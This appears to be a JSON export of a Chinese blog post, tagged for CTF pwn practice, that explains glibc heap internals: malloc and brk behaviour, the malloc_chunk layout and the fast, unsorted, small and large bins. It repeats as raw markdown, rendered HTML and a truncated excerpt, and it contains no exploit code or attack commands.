lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-17T04:09:19.532Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;ojfzveORWWdzC3RN6ooc\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;FyZdLwTWtfESSsWo7Yml\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}\"></div>\n<script type=\"text/javascript\" src=\"https://viewer.diagrams.net/js/viewer-static.min.js\"></script>\n\n#### fast bin\n\n在free一个chunk到fast bin时，它下一个chunk的P位（PREV_INUSE)是不会变的，还是为1，为了加快free的效率。**因此地址连续的两个chunk 被free到fast bin，他们不会被合并**。\n\n大小范围：0x10-0x40 （64位中0x20-0x80）每一个链表中存放的chunk大小相同，相邻bin存放的大小差0x8（0x10）字节\n\n新的chunk加入bin时，**fd**指向原来的栈顶\n\n#### unsorted bin\n\n大于global_max_fast（fast bin最大大小）的chunk都会放进来\n\n#### small bin\n\n存放小于0x200（0x400）的，也就是0x10-0x1f0（0x20-0x3f0）chunk，和fast bin相同，每个bin大小递增，因此有62个small bin\n\n#### large bin\n\n大于0x200（0x400），每一个bin中chunk大小不是相同的，按照大小降序排列\n\n\n\n### 内存分配流程\n\n ![](/img/heapexploitation/1.jpg)\n\n### 内存释放流程\n\n ![](/img/heapexploitation/2.jpg)\n\n\n\n\n\n\n\n[Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)\n\n[Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)\n\n[Syscalls used by malloc](https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/)\n\n[glibc 内存管理 ptmalloc 源代码分析](https://paper.seebug.org/papers/Archive/refs/heap/glibc内存管理ptmalloc源代码分析.pdf)\n\n[Painless intro to the Linux userland heap](https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/)","source":"_posts/heap exploitation.md","raw":"---\ntitle: Heap Exploitation\ntags: [ctf-pwn]\ndate: 2022-11-18 12:19:00\nexcerpt: basic knowledge in heap exploitation\n---\n\n### malloc\n\n```c++\n#include <stdlib.h>\nvoid *malloc(size_t size);\n```\n\nsize = 0时，返回系统允许的最小内存块\n\n32位系统下malloc(0)分配8Bytes，64位分配16Bytes\n\n\n\n### brk\n\n堆段的起点和终点标识符：start_brk、brk（program brk)\n\n不开ASLR，初始时都指向bss段末尾（end_data)\n\n开启ASLR，会随机向后偏移一段距离\n\n`brk()`函数作用为抬高brk指针，获取一段heap\n\n程序开始时heap大小为0，第一次申请堆的时候，通过brk()向系统申请一段内存  **main_arena**，后面malloc都会从main_arena中申请内存\n\n\n\n\n\n### chunk\n\n```C\nstruct malloc chunk{\n    INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free).*/\n    INTERNAL_SIZE_T mchunk_size;      /* Size in bytes，including overhead.*/\n    struct malloc chunk* fd;          /* double links -- used only if free.*/\n    struct malloc chunk* bk;          /* Only used for large blocks: pointer to next larger size. */\n    struct malloc_chunk* fd_nextsize; /* double links -- used only if free.*/\n    struct malloc chunk* bk_nextsize;\n}\ntypedef struct malloc_chunk* mchunkptr;\n```\n\n\n\n#### allocated chunk\n\n`prevsize `：如果前一个chunk是free的***（这里指的是内存中的前一个，而不是freelist中的前一个）***，它代表前一个chunk的大小；如果不是free的，存储前一个的user data 。32位中是4字节，64位中是8字节\n\n`size`：此chunk大小。最低3位用来存储N（chunk 在 non_main_arena里为1）、M（chunk是mmap得到的为1）、P（前一个chunk已被分配为1 对应prevsize），因此size是8字节对齐的\n\n`userdata`：数据\n\n（下一个chunk的prevsize也会存储userdata）\n\n```C\n#define request2size(req) ...   //可以计算申请字节需要实际分配多少字节\n```\n\nchunk是在prevsize开始，但是malloc返回的指针指向userdata\n\n\n\n#### free chunk \n\n`prevsize`：上一个chunk的userdata，因为上一个如果也是free，则会被合并（fast bin中可能会例外，后面会提及）\n\n`size`：同上\n\n`fd bk`：（在freelist中的）前一个/后一个chunk\n\n\n\n#### top chunk\n\n位于arena顶部。在所有bin都没有满足需求的chunk时，从top chunk切割\n\ntop chunk 不够，在main_arena中会用brk扩张top chunk，non_main_arena中，用mmap分配新的堆\n\n\n\n### Bin\n\n<div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-17T04:09:19.532Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;ojfzveORWWdzC3RN6ooc\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;FyZdLwTWtfESSsWo7Yml\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}\"></div>\n<script type=\"text/javascript\" src=\"https://viewer.diagrams.net/js/viewer-static.min.js\"></script>\n\n#### fast bin\n\n在free一个chunk到fast bin时，它下一个chunk的P位（PREV_INUSE)是不会变的，还是为1，为了加快free的效率。**因此地址连续的两个chunk 被free到fast bin，他们不会被合并**。\n\n大小范围：0x10-0x40 （64位中0x20-0x80）每一个链表中存放的chunk大小相同，相邻bin存放的大小差0x8（0x10）字节\n\n新的chunk加入bin时，**fd**指向原来的栈顶\n\n#### unsorted bin\n\n大于global_max_fast（fast bin最大大小）的chunk都会放进来\n\n#### small bin\n\n存放小于0x200（0x400）的，也就是0x10-0x1f0（0x20-0x3f0）chunk，和fast bin相同，每个bin大小递增，因此有62个small bin\n\n#### large bin\n\n大于0x200（0x400），每一个bin中chunk大小不是相同的，按照大小降序排列\n\n\n\n### 内存分配流程\n\n ![](/img/heapexploitation/1.jpg)\n\n### 内存释放流程\n\n ![](/img/heapexploitation/2.jpg)\n\n\n\n\n\n\n\n[Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)\n\n[Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)\n\n[Syscalls used by malloc](https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/)\n\n[glibc 内存管理 ptmalloc 源代码分析](https://paper.seebug.org/papers/Archive/refs/heap/glibc内存管理ptmalloc源代码分析.pdf)\n\n[Painless intro to the Linux userland heap](https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/)","slug":"heap exploitation","published":1,"updated":"2022-11-18T03:25:35.609Z","_id":"claknlrk20004zouf7n5lc6fn","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"malloc\"><a href=\"#malloc\" class=\"headerlink\" title=\"malloc\"></a>malloc</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c++\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-function\"><span class=\"hljs-type\">void</span> *<span class=\"hljs-title\">malloc</span><span class=\"hljs-params\">(<span class=\"hljs-type\">size_t</span> size)</span></span>;<br></code></pre></td></tr></table></figure>\n\n<p>size = 0时，返回系统允许的最小内存块</p>\n<p>32位系统下malloc(0)分配8Bytes，64位分配16Bytes</p>\n<h3 id=\"brk\"><a href=\"#brk\" class=\"headerlink\" title=\"brk\"></a>brk</h3><p>堆段的起点和终点标识符：start_brk、brk（program brk)</p>\n<p>不开ASLR，初始时都指向bss段末尾（end_data)</p>\n<p>开启ASLR，会随机向后偏移一段距离</p>\n<p><code>brk()</code>函数作用为抬高brk指针，获取一段heap</p>\n<p>程序开始时heap大小为0，第一次申请堆的时候，通过brk()向系统申请一段内存  <strong>main_arena</strong>，后面malloc都会从main_arena中申请内存</p>\n<h3 id=\"chunk\"><a href=\"#chunk\" class=\"headerlink\" title=\"chunk\"></a>chunk</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>&#123;</span><br>    INTERNAL_SIZE_T mchunk_prev_size; <span class=\"hljs-comment\">/* Size of previous chunk (if free).*/</span><br>    INTERNAL_SIZE_T mchunk_size;      <span class=\"hljs-comment\">/* Size in bytes，including overhead.*/</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>* <span class=\"hljs-title\">fd</span>;</span>          <span class=\"hljs-comment\">/* double links -- used only if free.*/</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>* <span class=\"hljs-title\">bk</span>;</span>          <span class=\"hljs-comment\">/* Only used for large blocks: pointer to next larger size. */</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span>* <span class=\"hljs-title\">fd_nextsize</span>;</span> <span class=\"hljs-comment\">/* double links -- used only if free.*/</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>* <span class=\"hljs-title\">bk_nextsize</span>;</span><br>&#125;<br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span>* <span class=\"hljs-title\">mchunkptr</span>;</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"allocated-chunk\"><a href=\"#allocated-chunk\" class=\"headerlink\" title=\"allocated chunk\"></a>allocated chunk</h4><p><code>prevsize </code>：如果前一个chunk是free的<em><strong>（这里指的是内存中的前一个，而不是freelist中的前一个）</strong></em>，它代表前一个chunk的大小；如果不是free的，存储前一个的user data 。32位中是4字节，64位中是8字节</p>\n<p><code>size</code>：此chunk大小。最低3位用来存储N（chunk 在 non_main_arena里为1）、M（chunk是mmap得到的为1）、P（前一个chunk已被分配为1 对应prevsize），因此size是8字节对齐的</p>\n<p><code>userdata</code>：数据</p>\n<p>（下一个chunk的prevsize也会存储userdata）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> request2size(req) ...   <span class=\"hljs-comment\">//可以计算申请字节需要实际分配多少字节</span></span><br></code></pre></td></tr></table></figure>\n\n<p>chunk是在prevsize开始，但是malloc返回的指针指向userdata</p>\n<h4 id=\"free-chunk\"><a href=\"#free-chunk\" class=\"headerlink\" title=\"free chunk\"></a>free chunk</h4><p><code>prevsize</code>：上一个chunk的userdata，因为上一个如果也是free，则会被合并（fast bin中可能会例外，后面会提及）</p>\n<p><code>size</code>：同上</p>\n<p><code>fd bk</code>：（在freelist中的）前一个/后一个chunk</p>\n<h4 id=\"top-chunk\"><a href=\"#top-chunk\" class=\"headerlink\" title=\"top chunk\"></a>top chunk</h4><p>位于arena顶部。在所有bin都没有满足需求的chunk时，从top chunk切割</p>\n<p>top chunk 不够，在main_arena中会用brk扩张top chunk，non_main_arena中，用mmap分配新的堆</p>\n<h3 id=\"Bin\"><a href=\"#Bin\" class=\"headerlink\" title=\"Bin\"></a>Bin</h3><div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-17T04:09:19.532Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;ojfzveORWWdzC3RN6ooc\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;FyZdLwTWtfESSsWo7Yml\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}\"></div>\n<script type=\"text/javascript\" src=\"https://viewer.diagrams.net/js/viewer-static.min.js\"></script>\n\n<h4 id=\"fast-bin\"><a href=\"#fast-bin\" class=\"headerlink\" title=\"fast bin\"></a>fast bin</h4><p>在free一个chunk到fast bin时，它下一个chunk的P位（PREV_INUSE)是不会变的，还是为1，为了加快free的效率。<strong>因此地址连续的两个chunk 被free到fast bin，他们不会被合并</strong>。</p>\n<p>大小范围：0x10-0x40 （64位中0x20-0x80）每一个链表中存放的chunk大小相同，相邻bin存放的大小差0x8（0x10）字节</p>\n<p>新的chunk加入bin时，<strong>fd</strong>指向原来的栈顶</p>\n<h4 id=\"unsorted-bin\"><a href=\"#unsorted-bin\" class=\"headerlink\" title=\"unsorted bin\"></a>unsorted bin</h4><p>大于global_max_fast（fast bin最大大小）的chunk都会放进来</p>\n<h4 id=\"small-bin\"><a href=\"#small-bin\" class=\"headerlink\" title=\"small bin\"></a>small bin</h4><p>存放小于0x200（0x400）的，也就是0x10-0x1f0（0x20-0x3f0）chunk，和fast bin相同，每个bin大小递增，因此有62个small bin</p>\n<h4 id=\"large-bin\"><a href=\"#large-bin\" class=\"headerlink\" title=\"large bin\"></a>large bin</h4><p>大于0x200（0x400），每一个bin中chunk大小不是相同的，按照大小降序排列</p>\n<h3 id=\"内存分配流程\"><a href=\"#内存分配流程\" class=\"headerlink\" title=\"内存分配流程\"></a>内存分配流程</h3><p> <img src=\"/img/heapexploitation/1.jpg\"></p>\n<h3 id=\"内存释放流程\"><a href=\"#内存释放流程\" class=\"headerlink\" title=\"内存释放流程\"></a>内存释放流程</h3><p> <img src=\"/img/heapexploitation/2.jpg\"></p>\n<p><a href=\"https://heap-exploitation.dhavalkapil.com/\">Heap Exploitation</a></p>\n<p><a href=\"https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\">Understanding glibc malloc</a></p>\n<p><a href=\"https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/\">Syscalls used by malloc</a></p>\n<p><a href=\"https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf\">glibc 内存管理 ptmalloc 源代码分析</a></p>\n<p><a href=\"https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/\">Painless intro to the Linux userland heap</a></p>\n","site":{"data":{}},"more":"<h3 id=\"malloc\"><a href=\"#malloc\" class=\"headerlink\" title=\"malloc\"></a>malloc</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c++\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-function\"><span class=\"hljs-type\">void</span> *<span class=\"hljs-title\">malloc</span><span class=\"hljs-params\">(<span class=\"hljs-type\">size_t</span> size)</span></span>;<br></code></pre></td></tr></table></figure>\n\n<p>size = 0时，返回系统允许的最小内存块</p>\n<p>32位系统下malloc(0)分配8Bytes，64位分配16Bytes</p>\n<h3 id=\"brk\"><a href=\"#brk\" class=\"headerlink\" title=\"brk\"></a>brk</h3><p>堆段的起点和终点标识符：start_brk、brk（program brk)</p>\n<p>不开ASLR，初始时都指向bss段末尾（end_data)</p>\n<p>开启ASLR，会随机向后偏移一段距离</p>\n<p><code>brk()</code>函数作用为抬高brk指针，获取一段heap</p>\n<p>程序开始时heap大小为0，第一次申请堆的时候，通过brk()向系统申请一段内存  <strong>main_arena</strong>，后面malloc都会从main_arena中申请内存</p>\n<h3 id=\"chunk\"><a href=\"#chunk\" class=\"headerlink\" title=\"chunk\"></a>chunk</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>&#123;</span><br>    INTERNAL_SIZE_T mchunk_prev_size; <span class=\"hljs-comment\">/* Size of previous chunk (if free).*/</span><br>    INTERNAL_SIZE_T mchunk_size;      <span class=\"hljs-comment\">/* Size in bytes，including overhead.*/</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>* <span class=\"hljs-title\">fd</span>;</span>          <span class=\"hljs-comment\">/* double links -- used only if free.*/</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>* <span class=\"hljs-title\">bk</span>;</span>          <span class=\"hljs-comment\">/* Only used for large blocks: pointer to next larger size. */</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span>* <span class=\"hljs-title\">fd_nextsize</span>;</span> <span class=\"hljs-comment\">/* double links -- used only if free.*/</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc</span> <span class=\"hljs-title\">chunk</span>* <span class=\"hljs-title\">bk_nextsize</span>;</span><br>&#125;<br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span>* <span class=\"hljs-title\">mchunkptr</span>;</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"allocated-chunk\"><a href=\"#allocated-chunk\" class=\"headerlink\" title=\"allocated chunk\"></a>allocated chunk</h4><p><code>prevsize </code>：如果前一个chunk是free的<em><strong>（这里指的是内存中的前一个，而不是freelist中的前一个）</strong></em>，它代表前一个chunk的大小；如果不是free的，存储前一个的user data 。32位中是4字节，64位中是8字节</p>\n<p><code>size</code>：此chunk大小。最低3位用来存储N（chunk 在 non_main_arena里为1）、M（chunk是mmap得到的为1）、P（前一个chunk已被分配为1 对应prevsize），因此size是8字节对齐的</p>\n<p><code>userdata</code>：数据</p>\n<p>（下一个chunk的prevsize也会存储userdata）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> request2size(req) ...   <span class=\"hljs-comment\">//可以计算申请字节需要实际分配多少字节</span></span><br></code></pre></td></tr></table></figure>\n\n<p>chunk是在prevsize开始，但是malloc返回的指针指向userdata</p>\n<h4 id=\"free-chunk\"><a href=\"#free-chunk\" class=\"headerlink\" title=\"free chunk\"></a>free chunk</h4><p><code>prevsize</code>：上一个chunk的userdata，因为上一个如果也是free，则会被合并（fast bin中可能会例外，后面会提及）</p>\n<p><code>size</code>：同上</p>\n<p><code>fd bk</code>：（在freelist中的）前一个/后一个chunk</p>\n<h4 id=\"top-chunk\"><a href=\"#top-chunk\" class=\"headerlink\" title=\"top chunk\"></a>top chunk</h4><p>位于arena顶部。在所有bin都没有满足需求的chunk时，从top chunk切割</p>\n<p>top chunk 不够，在main_arena中会用brk扩张top chunk，non_main_arena中，用mmap分配新的堆</p>\n<h3 id=\"Bin\"><a href=\"#Bin\" class=\"headerlink\" title=\"Bin\"></a>Bin</h3><div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-17T04:09:19.532Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;ojfzveORWWdzC3RN6ooc\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;FyZdLwTWtfESSsWo7Yml\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21h